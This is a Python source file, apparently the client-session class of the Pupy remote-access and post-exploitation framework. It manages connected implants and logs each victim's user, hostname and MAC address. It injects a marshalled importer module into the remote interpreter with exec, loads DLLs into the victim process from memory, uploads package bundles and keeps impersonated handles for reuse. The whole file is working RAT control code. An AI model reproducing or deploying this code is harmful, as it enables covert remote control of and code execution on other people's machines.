# -*- coding: utf-8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
# this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------

import zlib

import msgpack
import rpyc

from threading import Lock
from os import path

from . import ROOT, HOST_SYSTEM, HOST_CPU_ARCH, HOST_OS_ARCH
from .PupyCompile import pupycompile
from .PupyTriggers import event

from .payloads import dependencies
from .utils.rpyc_utils import obtain

from . import getLogger
logger = getLogger('client')

class PupyClient(object):
    def __init__(self, desc, pupsrv):
        self.desc = {
            (
                k.encode('utf-8') if type(k) == unicode else k
            ):(
                v.encode('utf-8') if type(v) == unicode else v
            ) for k,v in desc.iteritems()
        }

        #alias
        self.conn = self.desc['conn']
        self.native = self.desc['native']

        self.conn.events_receiver = self._event_receiver

        self.pupsrv = pupsrv
        self.imported_dlls = set()
        self.imported_modules = set()
        self.cached_modules = set()
        self.pupyimporter = None
        self.pupy_load_dll = False
        self.new_dlls = False
        self.new_modules = False
        self.remotes = {}
        self.remotes_lock = Lock()
        self.obtain_call = None

        self.load_pupyimporter()

        #to reuse impersonated handle in other modules
        self.impersonated_dupHandle = None

    def __str__(self):
        return 'PupyClient(id=%s, user=%s, hostname=%s, platform=%s)'%(
            self.desc["id"], self.desc["user"],
            self.desc["hostname"], self.desc["platform"]
        )

    @property
    def id(self):
        return self.desc['id']

    def _event_receiver(self, eventid):
        event(eventid, self, self.pupsrv, **self.desc)

    def get_conf(self):
        return {
            k:v for k,v in self.desc.iteritems() if k in (
                'offline_script', 'launcher', 'launcher_args',
                'cid', 'debug'
            )
        }

    def short_name(self):
        try:
            return '_'.join([
                self.desc['platform'][0:3].lower(),
                self.desc['hostname'],
                self.desc.get(
                    'node', self.desc['macaddr'].replace(':',''))
            ])

        except Exception:
            return "unknown"

    def node(self):
        return self.desc['macaddr'].replace(':', '').lower()

    def is_unix(self):
        return not self.is_windows()

    def is_posix(self):
        return self.desc['os_name'].lower() == 'posix'

    def is_linux(self):
        return "linux" in self.desc["platform"].lower()

    def is_java(self):
        return "java" in self.desc["platform"].lower()

    def is_android(self):
        return self.desc["platform"].lower()=="android"

    def is_windows(self):
        if "windows" in self.desc["platform"].lower():
            return True
        return False

    def is_solaris(self):
        return "sunos" in self.desc["platform"].lower()

    def is_darwin(self):
        if "darwin" in self.desc["platform"].lower():
            return True
        return False

    @property
    def platform(self):
        if self.is_android():
            return 'android'
        elif self.is_windows():
            return 'windows'
        elif self.is_linux():
            return 'linux'
        elif self.is_darwin():
            return 'darwin'
        elif self.is_solaris():
            return 'solaris'
        elif self.is_unix():
            return 'unix'

    @property
    def os_arch(self):
        arch = self.desc['os_arch'].lower()
        substitute = {
            'x86_64': 'amd64',
            'i386': 'x86',
            'i686': 'x86',
            'i486': 'x86',
        }
        return substitute.get(arch, arch)

    @property
    def arch(self):
        os_arch_to_platform = {
            'amd64': 'intel',
            'x86': 'intel',
            'i86pc': 'sun-intel',
            'armv7l': 'arm',
            'aarch64': 'arm',
        }

        os_platform_to_arch = {
            'intel': {
                '32bit': 'x86',
                '64bit': 'amd64'
            },
            'sun-intel': {
                # Yes.. Just one arch supported
                # The script is for amd64
                '32bit': 'i86pc',
                '64bit': 'i86pc'
            },
            'arm': {
                '32bit': 'arm',
                '64bit': 'aarch64'
            }
        }

        if self.os_arch in os_arch_to_platform:
            return os_platform_to_arch[
                os_arch_to_platform[self.os_arch]
            ][self.desc['proc_arch']]
        else:
            return None

    def is_proc_arch_64_bits(self):
        if "64" in self.desc["proc_arch"]:
            return True
        return False

    def match_server_arch(self):
        try:
            return all([
                self.desc['platform'] == HOST_SYSTEM,
                self.desc['proc_arch'] == HOST_CPU_ARCH,
                self.desc['os_arch'] == HOST_OS_ARCH
            ])

        except Exception as e:
            logger.error(e)

        return False

    def remote(self, module, function=None, need_obtain=True):
        remote_module = None
        remote_function = None

        with self.remotes_lock:
            if module in self.remotes:
                remote_module = self.remotes[module]['_']
            else:
                remote_module = getattr(self.conn.modules, module)
                self.remotes[module] = {
                    '_': remote_module
                }

            if function:
                if function in self.remotes[module]:
                    remote_function = self.remotes[module][function]
                else:
                    remote_function = getattr(self.conn.modules[module], function)
                    self.remotes[module][function] = remote_function

        if function and need_obtain:
            if self.obtain_call:
                return lambda *args, **kwargs: self.obtain_call(remote_function, *args, **kwargs)
            else:
                return lambda *args, **kwargs: obtain(remote_function(*args, **kwargs))

        elif function:
            return remote_function

        else:
            return remote_module

    def remote_const(self, module, variable):
        remote_module = None
        remote_variable = None

        with self.remotes_lock:
            if module in self.remotes:
                remote_module = self.remotes[module]['_']
            else:
                remote_module = getattr(self.conn.modules, module)
                self.remotes[module] = {
                    '_': remote_module
                }

            if variable in self.remotes[module]:
                remote_variable = self.remotes[module][variable]
            else:
                remote_variable = obtain(getattr(self.conn.modules[module], variable))
                self.remotes[module][variable] = remote_variable

        return remote_variable

    def load_pupyimporter(self):
        """ load pupyimporter in case it is not """

        if not self.conn.pupyimporter:
            try:
                self.pupyimporter = self.remote('pupyimporter')
            except:
                self.conn.execute('\n'.join([
                    'import imp, sys, marshal',
                    'mod = imp.new_module("pupyimporter")',
                    'mod.__file__="<bootloader>/pupyimporter"',
                    'exec marshal.loads({}) in mod.__dict__'.format(
                        repr(pupycompile(
                            path.join(ROOT, 'packages', 'all', 'pupyimporter.py'),
                            'pupyimporter.py', path=True, raw=True))),
                    'sys.modules["pupyimporter"]=mod',
                    'mod.install()']))

                self.pupyimporter = self.remote('pupyimporter')
        else:
            self.pupyimporter = self.conn.pupyimporter

        if self.conn.register_remote_cleanup:
            register_package_request_hook = rpyc.async(self.pupyimporter.register_package_request_hook)
            register_package_error_hook = rpyc.async(self.pupyimporter.register_package_error_hook)

            self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_request_hook)
            register_package_request_hook(self.remote_load_package)

            self.conn.register_remote_cleanup(self.pupyimporter.unregister_package_error_hook)
            register_package_error_hook(self.remote_print_error)

        self.pupy_load_dll = getattr(self.pupyimporter, 'load_dll', None)
        self.new_dlls = getattr(self.pupyimporter, 'new_dlls', None)
        self.new_modules = getattr(self.pupyimporter, 'new_modules', None)
        self.remote_add_package = rpyc.async(self.pupyimporter.pupy_add_package)
        self.remote_invalidate_package = rpyc.async(self.pupyimporter.invalidate_module)

        if self.conn.obtain_call:
            def obtain_call(function, *args, **kwargs):
                if args or kwargs:
                    packed_args = msgpack.dumps((args, kwargs))
                    packed_args = zlib.compress(packed_args)
                else:
                    packed_args = None

                result = self.conn.obtain_call(function, packed_args)
                result = zlib.decompress(result)
                result = msgpack.loads(result)

                return result

            self.obtain_call = obtain_call

        if self.obtain_call:
            self.imported_modules = set(self.obtain_call(self.conn.modules.sys.modules.keys))
            self.cached_modules = set(self.obtain_call(self.pupyimporter.modules.keys))
        else:
            self.imported_modules = set(obtain(self.conn.modules.sys.modules.keys()))
            self.cached_modules = set(obtain(self.pupyimporter.modules.keys()))


    def load_dll(self, modpath):
        """
            load some dll from memory like sqlite3.dll needed for some .pyd to work
            Don't load pywintypes27.dll and pythoncom27.dll with this. Use load_package("pythoncom") instead
        """
        name = path.basename(modpath)
        if name in self.imported_dlls:
            return False

        buf = dependencies.dll(name, self.platform, self.arch, native=self.native)
        if not buf:
            raise ImportError('Shared object {} not found'.format(name))

        if self.pupy_load_dll:
            result = self.pupy_load_dll(name, buf)
        else:
            result = self.conn.modules.pupy.load_dll(name, buf)

        if not result:
            raise ImportError('Couldn\'t load shared object {}'.format(name))
        else:
            self.imported_dlls.add(name)

        return True

    def filter_new_modules(self, modules, dll, force=None, remote=False):
        if force is None:
            modules = set(
                x for x in modules if x not in self.imported_modules
            )

            modules = set(
                module for module in modules if not any(
                    cached_module.startswith(
                        tuple(x.format(module.replace('.', '/')) for x in (
                            '{}.py', '{}/__init__.py', '{}.pyd', '{}.so',
                        ))
                    ) for cached_module in self.cached_modules
                )
            )

        if not modules:
            return []

        if remote:
            return modules

        if dll:
            if self.new_dlls:
                logger.debug('Request new dlls for %s', modules)
                return self.new_dlls(tuple(modules))
            else:
                return [
                    module for module in modules if module not in self.imported_dlls
                ]
        else:
            logger.debug('Request new modules for %s', modules)

            if self.new_modules:
                new_modules = self.new_modules(tuple(modules))
            else:
                new_modules = [
                    module for module in modules if not self.pupyimporter.has_module(module)
                ]

            for module in modules:
                if module not in new_modules:
                    self.imported_modules.add(module)
                    logger.debug('Add to imported_modules cache: %s', module)

            if force is not None:
                for module in modules:
                    if module not in new_modules:
                        force.add(module)
                        logger.debug('Add to new_modules: %s', module)

                return modules
            else:
                return new_modules

    def invalidate_packages(self, packages):
        if type(packages) in (str, unicode):
            packages = [packages]

        invalidated = False

        with self.remotes_lock:
            for module in packages:
                self.pupyimporter.invalidate_module(module)

                for m in self.remotes.keys():
                    if m == module or m.startswith(module+'.'):
                        invalidated = True
                        del self.remotes[m]

                to_remove = set()
                for m in self.imported_modules:
                    if m == module or m.startswith(module+'.'):
                        invalidated = True
                        to_remove.add(m)

                for m in to_remove:
                    self.imported_modules.remove(m)

                to_remove = set()
                for m in self.cached_modules:
                    if m == module or m.startswith(module+'.'):
                        invalidated = True
                        to_remove.add(m)

                for m in to_remove:
                    self.cached_modules.remove(m)

        return invalidated

    def load_package(self, requirements, force=False, remote=False, new_deps=[], honor_ignore=True):
        try:
            forced = None
            if force:
                forced = set()

            packages, contents, dlls = dependencies.package(
                requirements, self.platform, self.arch, remote=remote,
                posix=self.is_posix(), honor_ignore=honor_ignore,
                filter_needed_cb=lambda modules, dll: self.filter_new_modules(
                    modules, dll, forced, remote
                ), native=self.native
            )

            self.cached_modules.update(contents)

        except dependencies.NotFoundError, e:
            raise ValueError('Module not found: {}'.format(e))

        if remote:
            logger.info('load_package(%s) -> p:%s d:%s',
                requirements,
                len(packages) if packages else None,
                len(dlls) if dlls else None)

            return packages, dlls

        if not contents and not dlls:
            return False

        if dlls:
            if self.pupy_load_dll:
                for name, blob in dlls:
                    self.pupy_load_dll(name, blob)
            else:
                for name, blob in dlls:
                    self.conn.modules.pupy.load_dll(name, blob)

            if not contents:
                return True

        if not contents:
            return False

        if forced:
            self.invalidate_packages(forced)

        logger.info('Upload packages bundle, size=%d', len(packages))
        self.remote_add_package(
            packages,
            compressed=True,
            # Use None to prevent import-then-clean-then-search behavior
            name=(
                None if type(requirements) != str else requirements
            )
        )

        new_deps.extend(contents)
        return True

    def unload_package(self, module_name):
        if not module_name.endswith(('.so', '.dll', '.pyd')):
            self.remote_invalidate_module(module_name)

    def remote_load_package(self, module_name):
        logger.info('remote_load_package for %s started', module_name)

        try:
            return self.load_package(module_name, remote=True)

        except dependencies.NotFoundError:
            logger.info('remote_load_package for %s failed', module_name)
            return None, None

        finally:
            logger.info('remote_load_package for %s completed', module_name)

    def remote_print_error(self, msg):
        self.pupsrv.handler.display_warning(msg)
